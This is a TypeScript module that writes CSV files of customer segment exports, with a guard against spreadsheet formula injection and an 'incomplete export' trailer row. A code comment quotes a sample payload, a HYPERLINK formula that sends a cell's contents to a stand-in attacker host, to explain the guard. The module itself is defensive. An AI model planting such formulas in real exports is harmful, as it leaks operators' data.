/**
 * The CSV body for a segment export, separated from the route so the trailing "incomplete" row
 * and the completion flag it mirrors in a header can be asserted without a live request, a
 * database, or the ten-thousand-row fixture the real cap would otherwise require.
 */

/** Mirrors the route's own cap on the FILE (as opposed to `REQUEST_MAX_CHECKED`, the cap on the WORK). */
export const MAX_ROWS = 10_000

export type SegmentExportResolution = {
  ids: string[]
  complete: boolean
  checked: number
}

export type SegmentExportRow = {
  id: string
  displayName?: string | null
  primaryEmail?: string | null
}

/**
 * Quoting is not the only thing a CSV cell needs.
 *
 * `display_name` is customer-controlled — public sign-up accepts it — so a customer registering as
 * `=HYPERLINK("https://evil/?d="&A1,"x")` executes in whatever spreadsheet the operator opens this file with.
 * RFC 4180 quoting does nothing about that: the cell is a perfectly well-formed string that Excel and Sheets
 * both treat as a formula.
 *
 * The platform already solved this in `packages/shared/src/lib/crud/exporters.ts`; this module wrote its own
 * emitter and lost the guard with it. Prefixing an apostrophe is that file's answer and it is the standard one:
 * the cell displays unchanged and is never evaluated.
 */
const FORMULA_LEAD = /^[=+\-@\t\r\n]/

export function csvCell(value: string | null): string {
  const raw = value ?? ''
  const text = FORMULA_LEAD.test(raw) ? `'${raw}` : raw
  if (!/[",\r\n]/.test(text)) return text
  return `"${text.replace(/"/g, '""')}"`
}

export type SegmentExportCsv = {
  csv: string
  /** Whether the file is the whole segment — the same value the route mirrors in a response header. */
  complete: boolean
}

/**
 * The cap is also written INTO the file, not only into a response header.
 *
 * The link that downloads this is a plain `<a href download>` — a browser navigation, not a `fetch` — so no
 * script in this app ever reads `x-om-segment-export-complete`. A header nobody can see is exactly a silent
 * cap wearing a header, and the person who opens this in a spreadsheet sees a file that ends cleanly and
 * looks like everybody. A trailing row keeps the same three columns (so nothing shifts out of alignment)
 * and a value so distinctive the quoting rules in `csvCell` never mistake it for data.
 */
export function buildSegmentExportCsv(resolution: SegmentExportResolution, rows: SegmentExportRow[]): SegmentExportCsv {
  const byId = new Map(rows.map((row) => [row.id, row]))
  const lines = ['customer_id,display_name,email']
  for (const id of resolution.ids) {
    const row = byId.get(id)
    lines.push([csvCell(id), csvCell(row?.displayName ?? null), csvCell(row?.primaryEmail ?? null)].join(','))
  }

  const complete = resolution.complete && resolution.ids.length < MAX_ROWS
  if (!complete) {
    lines.push([
      csvCell('⚠ INCOMPLETE EXPORT'),
      csvCell(`Only ${resolution.checked} of the segment were checked before the limit was reached`),
      csvCell('Narrow the segment or re-run to see the rest'),
    ].join(','))
  }

  return { csv: `${lines.join('\r\n')}\r\n`, complete }
}
